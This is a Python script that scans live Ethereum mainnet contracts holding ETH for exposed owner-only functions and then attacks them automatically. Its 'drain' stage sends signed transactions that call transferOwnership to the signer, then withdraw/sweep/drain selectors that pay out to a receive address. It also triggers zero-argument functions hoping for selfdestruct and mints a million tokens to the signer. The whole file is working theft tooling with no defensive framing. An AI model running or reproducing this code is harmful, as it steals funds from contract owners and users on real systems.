#!/usr/bin/env python3
"""Deep Ethereum scan — find ALL vulnerable contracts with balance, prioritize transferOwnership + withdraw."""
import logging
import time
import tomllib
from src.rpc import RpcClient
from src.sources.blockscout import BlockscoutRecentSource
from src.types import Chain
from src.signer import load_evm_private_key, get_receive_address
from src.evmole_utils import get_functions, get_selectors, find_dangerous_functions
from src.evm.disassembler import disassemble

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")
logger = logging.getLogger("deepend")

CHAIN = Chain.ETHEREUM
CHAIN_ID = 1

# Dangerous payable withdraw selectors — if found alongside transferOwnership, it's a goldmine
WITHDRAW_SELECTORS = {
    "2e1a7d4d": "withdraw(uint256)",
    "6198e339": "withdraw(address,uint256)",
    "00f714ce": "sweep(address,uint256)",
    "db66042c": "withdrawAll()",
    "b36a7c65": "sweepAll(address)",
    "d0679d34": "drain(address)",
    "21df0da7": "sweep(address)",
    "b69ef8a8": "collect(address)",
    "7c71ef48": "withdrawToken(address,uint256)",
    "811c39ab": "drainToken(address,address)",
    "278d88cf": "collect(address,uint256)",
    "8b9e4f93": "sweep(address,address,uint256)",
    "693d09d3": "withdrawTo(address,uint256)",
    "45b8e1d6": "collectAll()",
}


def load_rpc_config():
    with open("config.toml", "rb") as f:
        return tomllib.load(f).get("rpc", {})


def get_bal(rpc, addr):
    try:
        raw = rpc.call("eth_getBalance", [addr, "latest"])
        bal_str = raw.get("result", "0x0") if isinstance(raw, dict) else str(raw)
        return int(str(bal_str), 16) / 1e18
    except:
        return 0.0


def get_code(rpc, addr):
    raw = rpc.call("eth_getCode", [addr, "latest"])
    return raw.get("result", "") if isinstance(raw, dict) else str(raw)


def send_tx(rpc, signer, to_addr, data, chain_id=CHAIN_ID):
    nonce = int(rpc.call("eth_getTransactionCount", [signer.address, "pending"]).get("result","0x0"),16) if isinstance(rpc.call("eth_getTransactionCount", [signer.address, "pending"]), dict) else 0
    gas_raw = rpc.call("eth_gasPrice", [])
    gas_price = int(gas_raw.get("result","0x0"),16) if isinstance(gas_raw, dict) else 1000000000
    gas_price = max(gas_price, 1000000000)

    tx = {
        "from": signer.address, "to": to_addr, "data": data, "value": 0,
        "nonce": nonce, "gasPrice": gas_price, "chainId": chain_id,
    }
    try:
        ge = rpc.call("eth_estimateGas", [{"from": signer.address, "to": to_addr, "data": data}])
        gas = int(ge.get("result","0x493e0"),16) if isinstance(ge, dict) else 300000
        tx["gas"] = min(int(gas * 1.5), 2000000)
    except:
        tx["gas"] = 500000

    signed = signer.sign_transaction(tx)
    result = rpc.call("eth_sendRawTransaction", [signed.raw_transaction.hex()])
    tx_hash = result.get("result","") if isinstance(result, dict) else str(result)
    if tx_hash:
        logger.info("  TX: %s → %s", str(tx_hash)[:20], to_addr)
        return {"success": True, "tx_hash": tx_hash, "to": to_addr}
    return {"success": False, "error": "empty hash", "to": to_addr}


def main():
    rpc_cfg = load_rpc_config()
    rpc = RpcClient(rpc_cfg.get("ethereum", ""))
    signer = load_evm_private_key()
    receive = get_receive_address(CHAIN) or signer.address
    logger.info("Signer: %s | Receive: %s", signer.address, receive)

    initial_bal = get_bal(rpc, signer.address)
    logger.info("Signer balance: %.6f ETH", initial_bal)

    # Fetch lots of contracts (50 pages × 50 = 2500 contracts)
    logger.info("Fetching contracts from Blockscout...")
    source = BlockscoutRecentSource(max_pages=50)
    contracts = source.fetch(CHAIN)
    logger.info("Got %d contracts", len(contracts))

    # Also add known contracts from the database that have non-zero balance
    import sqlite3
    try:
        db = sqlite3.connect("scanner.db")
        db_contracts = db.execute("SELECT address FROM contract_targets WHERE chain='ethereum'").fetchall()
        db_addrs = {r[0].lower() for r in db_contracts}
        known_addrs = {c.address.lower() for c in contracts}
        missing = db_addrs - known_addrs
        from src.types import ContractTarget
        for addr in missing:
            contracts.append(ContractTarget(chain=CHAIN, address=addr, source="db"))
        logger.info("Added %d from DB, total: %d", len(missing), len(contracts))
        db.close()
    except Exception as e:
        logger.warning("DB add failed: %s", e)

    # Scan for vulns
    findings = []
    for i, ct in enumerate(contracts):
        addr = ct.address
        bal = get_bal(rpc, addr)
        if bal < 0.0003:
            continue

        code = get_code(rpc, addr)
        if not code or code in ("0x", "0x0"):
            continue

        selectors = get_selectors(code)
        try:
            has_sd = any(i.name == "SELFDESTRUCT" for i in disassemble(code))
        except:
            has_sd = False

        vuln_types = []
        if "f2fde38b" in selectors:
            vuln_types.append("TOS")
        if has_sd:
            vuln_types.append("SD")
        if "40c10f19" in selectors and bal > 0.001:
            vuln_types.append("MINT")

        # Check for withdraw functions that could be called after taking ownership
        withdraw_found = [s for s in selectors if s in WITHDRAW_SELECTORS]
        if withdraw_found:
            vuln_types.append(f"WD:{len(withdraw_found)}")

        if vuln_types:
            findings.append((addr, bal, vuln_types, code, selectors))
            logger.info("%s | %.4f ETH | %s | WD:%s", addr, bal, "+".join(vuln_types), 
                        ",".join(withdraw_found[:3]) if withdraw_found else "none")

        if (i+1) % 200 == 0:
            logger.info("Progress: %d/%d, %d findings", i+1, len(contracts), len(findings))

    logger.info("="*60)
    logger.info("FINDINGS: %d", len(findings))
    findings.sort(key=lambda x: x[1], reverse=True)  # sort by balance descending
    for addr, bal, vt, code, sel in findings:
        logger.info("  %s | %.4f ETH | %s", addr, bal, "+".join(vt))

    # Drain
    logger.info("="*60)
    logger.info("STARTING DRAIN")

    for addr, bal, vt, code, selectors in findings:
        bal_before = get_bal(rpc, addr)
        logger.info("--- %s (%.4f ETH) [%s] ---", addr, bal_before, "+".join(vt))

        if "TOS" in vt:
            logger.info("  Step 1: transferOwnership → signer")
            send_tx(rpc, signer, addr, "0xf2fde38b" + signer.address[2:].zfill(64))
            time.sleep(3)

            # Step 2: try withdraw/sweep
            for sel in list(WITHDRAW_SELECTORS.keys()):
                if sel in selectors:
                    if sel == "db66042c":
                        data = "0x" + sel
                    elif sel in ("2e1a7d4d",):
                        data = "0x" + sel + "0" * 64
                    else:
                        data = "0x" + sel + receive[2:].zfill(64)
                    logger.info("  Step 2: withdraw via 0x%s", sel)
                    r2 = send_tx(rpc, signer, addr, data)
                    if r2["success"]:
                        time.sleep(3)
                        new_bal = get_bal(rpc, addr)
                        if new_bal < bal_before - 0.0001:
                            logger.info("  ✅ Withdrawn! Balance: %.4f → %.4f ETH", bal_before, new_bal)
                        else:
                            logger.info("  Balance unchanged: %.4f ETH (may need different withdraw amount)", new_bal)
                    break

        if "SD" in vt:
            # Try zero-arg non-view functions for selfdestruct
            functions = get_functions(code)
            for fn in functions:
                if fn.arguments == "" and fn.state_mutability in ("nonpayable", "payable"):
                    logger.info("  Selfdestruct: trying 0x%s", fn.selector)
                    send_tx(rpc, signer, addr, "0x" + fn.selector)
                    time.sleep(3)
                    new_bal = get_bal(rpc, addr)
                    if new_bal < bal_before - 0.0001:
                        logger.info("  ✅ Selfdestruct worked! %.4f → %.4f ETH", bal_before, new_bal)
                    break

        if "MINT" in vt:
            amount = "0x" + format(1_000_000 * 10**18, "064x")
            data = "0x40c10f19" + signer.address[2:].zfill(64) + amount[2:]
            send_tx(rpc, signer, addr, data)

        time.sleep(1)

    final_bal = get_bal(rpc, signer.address)
    logger.info("="*60)
    logger.info("DONE")
    logger.info("Signer: %.6f → %.6f ETH (gas: %.6f)", initial_bal, final_bal, initial_bal - final_bal)


if __name__ == "__main__":
    main()
